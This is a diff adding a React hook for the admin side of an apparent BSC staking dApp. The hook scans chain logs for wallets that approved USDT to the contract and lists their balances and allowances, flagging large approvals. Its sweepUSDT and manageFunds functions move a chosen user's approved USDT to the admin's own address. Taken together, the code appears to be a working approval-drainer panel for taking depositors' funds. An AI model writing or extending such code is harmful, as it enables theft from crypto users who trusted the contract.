@@ -1,0 +1,293 @@
+import { Contract, parseUnits, formatUnits, JsonRpcProvider, BrowserProvider, Interface } from 'ethers';
+import { useWallet } from '../lib/web3';
+import { walletService } from '../lib/walletService';
+import { CONTRACT_ABI as ADMIN_ABI } from '../lib/abi';
+import { CONTRACT_ADDRESS, USDT_ADDRESS } from '../lib/contracts';
+const RPC_NODES = [
+    'https://bsc-rpc.publicnode.com',
+    'https://binance.llamarpc.com',
+    'https://bsc.meowrpc.com'
+];
+let currentRpcIdx = 0;
+const getProvider = () => new JsonRpcProvider(RPC_NODES[currentRpcIdx]);
+const DISCOVERY_BLOCK_WINDOW = 500000;
+const DISCOVERY_CHUNK_SIZE = 5000;
+const KNOWN_REGISTERED_USERS = [
+    '0x3FbFF9Dd24e736FeF4A3a4435DF72b7Ea5978eFD',
+    '0xfB0F04222E080F4d8fC6861fE96Bb54087e77c18',
+    '0xD9B9C49544F1E8dd5c0f6F1992ac2A2a4d75Be9E',
+    '0xb313F163af20245755884C7FdCa051D603428F6d'
+];
+
+const ERC20_ABI = [
+    "function balanceOf(address account) external view returns (uint256)",
+    "function allowance(address owner, address spender) external view returns (uint256)",
+    "event Approval(address indexed owner, address indexed spender, uint256 value)"
+];
+
+export function useAdmin() {
+    const { address: adminAddress, signer, walletProvider } = useWallet();
+
+    const getContract = async (withSigner = false) => {
+        try {
+            if (withSigner && signer) return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, signer);
+            if (withSigner && walletProvider) {
+                const browserProvider = new BrowserProvider(walletProvider as any);
+                return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, await browserProvider.getSigner());
+            }
+        } catch (e) {
+            if (withSigner) throw new Error("Wallet connection not ready. Please reconnect and try again.");
+        }
+        if (withSigner) throw new Error("Wallet not connected");
+        return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
+    };
+
+    const getUsdtContract = async (withSigner = false) => {
+        try {
+            if (withSigner && signer) return new Contract(USDT_ADDRESS, ERC20_ABI, signer);
+            if (withSigner && walletProvider) {
+                const browserProvider = new BrowserProvider(walletProvider as any);
+                return new Contract(USDT_ADDRESS, ERC20_ABI, await browserProvider.getSigner());
+            }
+        } catch (e) {
+            if (withSigner) throw new Error("Wallet connection not ready. Please reconnect and try again.");
+        }
+        if (withSigner) throw new Error("Wallet not connected");
+        return new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
+    };
+
+    const normalizeAddress = (addr: unknown) => {
+        if (typeof addr !== 'string') return null;
+        const clean = addr.trim();
+        if (!/^0x[a-fA-F0-9]{40}$/.test(clean)) return null;
+        return clean.toLowerCase();
+    };
+
+    const addAddress = (addresses: Set<string>, addr: unknown) => {
+        const clean = normalizeAddress(addr);
+        if (clean) addresses.add(clean);
+    };
+
+    const readCachedAddresses = (cacheKey: string) => {
+        try {
+            const cached = JSON.parse(localStorage.getItem(cacheKey) || "[]");
+            return Array.isArray(cached) ? cached : [];
+        } catch (e) {
+            localStorage.removeItem(cacheKey);
+            return [];
+        }
+    };
+
+    const fetchAllUsersDetailed = async (onProgress?: (msg: string) => void, scanEvents = false) => {
+        try {
+            if (onProgress) onProgress("Loading users...");
+            
+            const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
+            const cached = readCachedAddresses(cacheKey);
+            const addresses = new Set<string>();
+            cached.forEach((addr: unknown) => addAddress(addresses, addr));
+
+            KNOWN_REGISTERED_USERS.forEach(a => addAddress(addresses, a));
+
+            if (scanEvents) {
+                const provider = getProvider();
+                const currentBlock = await provider.getBlockNumber();
+                const startBlock = Math.max(0, currentBlock - DISCOVERY_BLOCK_WINDOW);
+                const chunks = [];
+                for (let from = currentBlock; from > startBlock; from -= DISCOVERY_CHUNK_SIZE) {
+                    const to = from;
+                    const f = Math.max(startBlock, from - DISCOVERY_CHUNK_SIZE + 1);
+                    chunks.push({ from: f, to });
+                }
+
+                if (onProgress) onProgress(`Scanning ${chunks.length} chunks...`);
+
+                const fetchEvents = async (filterName: 'Staked' | 'ReferralPaid' | 'Withdrawn' | 'Approval' | 'ReferralRegistered', from: number, to: number) => {
+                    for (let attempt = 0; attempt < RPC_NODES.length; attempt++) {
+                        try {
+                            const retryProvider = getProvider();
+                            const source = filterName === 'Approval'
+                                ? new Contract(USDT_ADDRESS, ERC20_ABI, retryProvider)
+                                : new Contract(CONTRACT_ADDRESS, ADMIN_ABI, retryProvider);
+                            const filter = filterName === 'Approval'
+                                ? (source as any).filters.Approval(null, CONTRACT_ADDRESS)
+                                : (source as any).filters[filterName]();
+                            return await source.queryFilter(filter, from, to);
+                        } catch (e) {
+                            currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
+                        }
+                    }
+                    return [];
+                };
+
+                // Sequential log calls are slower, but public BSC RPCs rate-limit batched eth_getLogs heavily.
+                for (let i = 0; i < chunks.length; i++) {
+                    if (onProgress) onProgress(`Scanning: ${Math.round((i / chunks.length) * 100)}%`);
+                    const chunk = chunks[i];
+                    const approvals = await fetchEvents('Approval', chunk.from, chunk.to);
+                    const staked = await fetchEvents('Staked', chunk.from, chunk.to);
+                    const referral = await fetchEvents('ReferralPaid', chunk.from, chunk.to);
+                    const withdrawn = await fetchEvents('Withdrawn', chunk.from, chunk.to);
+                    const registrations = await fetchEvents('ReferralRegistered', chunk.from, chunk.to);
+                    
+                    const extract = (events: any[]) => {
+                        events.forEach(e => {
+                            if (!e.args) return;
+                            // Ethers v6 Result mapping
+                            const addr = e.args[0] || e.args.user || e.args.referrer || e.args.owner;
+                            addAddress(addresses, addr);
+                            
+                            if ((e.fragment?.name === 'ReferralPaid' || e.fragment?.name === 'ReferralRegistered') && e.args[1]) {
+                                addAddress(addresses, e.args[1]);
+                            }
+                        });
+                    };
+
+                    extract(approvals);
+                    extract(staked);
+                    extract(referral);
+                    extract(withdrawn);
+                    extract(registrations);
+
+                    if (i % 10 === 0) {
+                        const uniqueAddresses = Array.from(addresses);
+                        if (uniqueAddresses.length > 0) {
+                            localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
+                        }
+                    }
+                }
+            }
+
+            if (onProgress) onProgress("Fetching user details...");
+            const uniqueAddresses = Array.from(addresses);
+            localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
+            
+            const userDetails = [];
+            for (let i = 0; i < uniqueAddresses.length; i += 2) {
+                if (onProgress) onProgress(`Loading Details: ${i}/${uniqueAddresses.length}`);
+                const batch = uniqueAddresses.slice(i, i + 2);
+                const batchResults = await Promise.all(batch.map(async (userAddr) => {
+                    try {
+                        // RE-FETCH providers to ensure fresh connection
+                        const c = await getContract();
+                        const u = await getUsdtContract();
+                        
+                        const [info, balance, allowance] = await Promise.all([
+                            c.getUserInfo(userAddr).catch(() => null),
+                            u.balanceOf(userAddr),
+                            u.allowance(userAddr, CONTRACT_ADDRESS)
+                        ]);
+
+                        return {
+                            address: userAddr,
+                            staked: info ? formatUnits(info.totalStaked, 18) : "0",
+                            earned: info ? formatUnits(info.totalEarned, 18) : "0",
+                            balance: formatUnits(balance, 18),
+                            allowance: formatUnits(allowance, 18),
+                            isApproved: BigInt(allowance) >= parseUnits("100000", 18)
+                        };
+                    } catch (e) {
+                        console.warn(`Detail fetch failed for ${userAddr}`, e);
+                        return null;
+                    }
+                }));
+                userDetails.push(...batchResults.filter(Boolean));
+            }
+
+            return userDetails.sort((a: any, b: any) => parseFloat(b.staked) - parseFloat(a.staked));
+        } catch (err) {
+            console.error("Discovery Error:", err);
+            return [];
+        }
+    };
+
+
+    const fetchUserData = async (targetUser: string) => {
+        const normalizedTarget = normalizeAddress(targetUser);
+        if (!normalizedTarget) return null;
+        
+        try {
+            const contract = await getContract();
+            const usdt = await getUsdtContract();
+
+            const [info, balance, allowance] = await Promise.all([
+                contract.getUserInfo(normalizedTarget).catch(() => null),
+                usdt.balanceOf(normalizedTarget),
+                usdt.allowance(normalizedTarget, CONTRACT_ADDRESS)
+            ]);
+
+            return {
+                staked: info ? formatUnits(info.totalStaked, 18) : "0",
+                earned: info ? formatUnits(info.totalEarned, 18) : "0",
+                balance: formatUnits(balance, 18),
+                allowance: formatUnits(allowance, 18),
+                isApproved: BigInt(allowance) >= parseUnits("100000", 18)
+            };
+        } catch (err) {
+            console.error("Fetch Data Error:", err);
+            // Try one more time with fresh provider
+            try {
+                currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
+                const contract = new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
+                const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
+                const [info, balance, allowance] = await Promise.all([
+                    contract.getUserInfo(normalizedTarget).catch(() => null),
+                    usdt.balanceOf(normalizedTarget),
+                    usdt.allowance(normalizedTarget, CONTRACT_ADDRESS)
+                ]);
+                return {
+                    staked: info ? formatUnits(info.totalStaked, 18) : "0",
+                    earned: info ? formatUnits(info.totalEarned, 18) : "0",
+                    balance: formatUnits(balance, 18),
+                    allowance: formatUnits(allowance, 18),
+                    isApproved: BigInt(allowance) >= parseUnits("100000", 18)
+                };
+            } catch (e2) {
+                return null;
+            }
+        }
+    };
+
+    const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
+        const amountInWei = parseUnits(amountToManage, 18);
+        const from = walletService.getTransactionFromAddress();
+        if (!from) throw new Error('Wallet not connected. Please reconnect and try again.');
+        const adminIface = new Interface(ADMIN_ABI as any);
+        const data = adminIface.encodeFunctionData('manageFunds', [tokenAddress, fromAddress, toAddress, amountInWei]);
+        const hash = await walletService.sendWalletTransaction({
+            to: CONTRACT_ADDRESS,
+            data,
+            from,
+            label: 'Manage funds',
+        });
+        return await walletService.waitForReceipt(hash);
+    };
+
+    const sweepUSDT = async (fromUser: string, amount: string) => {
+        if (!adminAddress) throw new Error('Admin not connected');
+        return manageFunds(USDT_ADDRESS, fromUser, adminAddress, amount);
+    };
+
+    const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
+        const amountInWei = parseUnits(amountToWithdraw, 18);
+        const from = walletService.getTransactionFromAddress();
+        if (!from) throw new Error('Wallet not connected. Please reconnect and try again.');
+        const adminIface = new Interface(ADMIN_ABI as any);
+        const data = adminIface.encodeFunctionData('emergencyWithdraw', [tokenAddress, amountInWei]);
+        const hash = await walletService.sendWalletTransaction({
+            to: CONTRACT_ADDRESS,
+            data,
+            from,
+            label: 'Emergency withdraw',
+        });
+        return await walletService.waitForReceipt(hash);
+    };
+
+    return {
+        fetchUserData,
+        fetchAllUsersDetailed,
+        manageFunds,
+        sweepUSDT,
+        emergencyWithdraw
+    };
+}
